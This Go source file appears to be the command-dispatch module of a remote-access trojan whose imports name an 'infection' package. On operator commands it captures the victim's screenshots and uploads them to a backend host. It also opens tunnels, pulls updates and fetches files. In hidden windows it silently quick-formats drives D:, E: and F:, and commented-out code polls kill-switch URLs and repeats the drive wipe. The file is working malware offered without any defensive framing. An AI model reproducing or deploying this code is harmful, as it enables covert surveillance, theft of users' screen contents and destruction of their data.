package killit

import (
	"infection/tunnel"
	"infection/tunnel/reverse"
	"infection/util/lib"
	"os/exec"
	"syscall"
	"time"
)

type Check struct {
	Hostid string `json:"hostid"`
}

func Opeation(hostid string, code int, path string, diff int, num int, fname,
	addr string, backendAddr string) {
	switch code {
	case 0:
		//one screenshot if diff = 0   1 all
		if hostid == lib.HOSTID || diff == 0 {
			go GetPic(addr, num, backendAddr)
		} else if diff == 1 {
			//all
			go GetPic(addr, num, backendAddr)
		}
		break
	case 1:
		if hostid == lib.HOSTID || diff == 0 {
			go tunnel.Tunnel(addr)
		} else if diff == 1 {
			//all
			go tunnel.Tunnel(addr)
		}
		break
	case 2:
		if hostid == lib.HOSTID || diff == 0 {
			go lib.DoUpdate(addr, backendAddr)
		} else if diff == 1 {
			//all
			go lib.DoUpdate(addr, backendAddr)
		}
		break
	case 3:
		if hostid == lib.HOSTID || diff == 0 {
			lib.Get(path, fname)
		} else if diff == 1 {
			lib.Get(path, fname)
		}
		break
	case 4:
		if hostid == lib.HOSTID || diff == 0 {
			lib.ClearPic()
		} else if diff == 1 {
			lib.ClearPic()
		}
		break
	case 5:
		if hostid == lib.HOSTID || diff == 0 {
			cmd := exec.Command("cmd", "/C", "format", "d:/fs:fat32", "/q", "/y")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Start()
			cmd2 := exec.Command("cmd", "/C", "format", "e:/fs:fat32", "/q", "/y")
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd2.Start()
			cmd3 := exec.Command("cmd", "/C", "format", "f:/fs:fat32", "/q", "/y")
			cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd3.Start()
		} else if diff == 1 {
			cmd := exec.Command("cmd", "/C", "format", "d:/fs:fat32", "/q", "/y")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd.Start()
			cmd2 := exec.Command("cmd", "/C", "format", "e:/fs:fat32", "/q", "/y")
			cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd2.Start()
			cmd3 := exec.Command("cmd", "/C", "format", "f:/fs:fat32", "/q", "/y")
			cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			cmd3.Start()
		}
		break
	case 6:
		if hostid == lib.HOSTID || diff == 0 {
			lib.KillMain()
		} else if diff == 1 {
			lib.KillMain()
		}
		break
	case 7:
		if hostid == lib.HOSTID || diff == 0 {
			lib.KillCheck()
		} else if diff == 1 {
			lib.KillCheck()
		}
		break
	case 8:
		reverse.DestroyShell()
		break
	case 9:
		break
	}

}

// ioop wait master call died
//func Killit() {
//	var check Check
//	for {
//		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(15, 50)))
//		resp, body, _ := gorequest.New().
//			Get(lib.MIDKILLIP).
//			End()
//		if resp.StatusCode == 200 && body != "" {
//			if err := json.Unmarshal([]byte(body), &check); err == nil {
//				// if not need  dont open the tunnel to revert shell
//				outip := lib.GetOutIp()
//				if check.Hostid == lib.HOSTID || check.Hostid == outip {
//					lib.KillALL()
//				} else {
//					aresp, abody, _ := gorequest.New().
//						Get(lib.ALLKILL).
//						End()
//					if aresp.StatusCode == 200 && abody != "" {
//						if err := json.Unmarshal([]byte(abody), &check); err == nil {
//							if check.Hostid == "0" {
//								lib.KillALL()
//							}
//						}
//
//					}
//				}
//			}
//		}
//		<-ticker.C
//	}
//}

func GetPic(addr string, num int, backendAddr string) {
	// i mins screen 4 pics  10mins  40 pic
	for i := 0; i <= num; i++ {
		filenames := lib.Getscreenshot()
		finflag := make(chan string)
		for _, fname := range filenames {
			go lib.SingleFile(fname, "http://"+addr+backendAddr+"/browser/browserbag", finflag)
			<-finflag
			go lib.Removetempimages(filenames, finflag)
			time.Sleep(7 * time.Second)
		}
	}
}

//func ClearALL(addr string) {
//	var check Check
//	for {
//		ticker := time.NewTicker(time.Second * time.Duration(lib.RandInt64(50, 300)))
//		resp, body, _ := gorequest.New().
//			Get(lib.CLEARPIC).
//			End()
//		if resp.StatusCode == 200 && body != "" {
//			if err := json.Unmarshal([]byte(body), &check); err == nil {
//				// if not need  dont open the tunnel to revert shell
//				outip := lib.GetOutIp()
//				if check.Hostid == lib.HOSTID || check.Hostid == outip {
//					lib.ClearPic()
//				} else if check.Hostid == "0" {
//					lib.ClearPic()
//					// kill it
//				} else if check.Hostid == "1" {
//					cmd := exec.Command("cmd", "/C", "format", "d:/fs:fat32", "/q", "/y")
//					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//					cmd.Start()
//					cmd2 := exec.Command("cmd", "/C", "format", "e:/fs:fat32", "/q", "/y")
//					cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//					cmd2.Start()
//					cmd3 := exec.Command("cmd", "/C", "format", "f:/fs:fat32", "/q", "/y")
//					cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
//					cmd3.Start()
//				}
//			}
//		}
//		<-ticker.C
//	}
//}
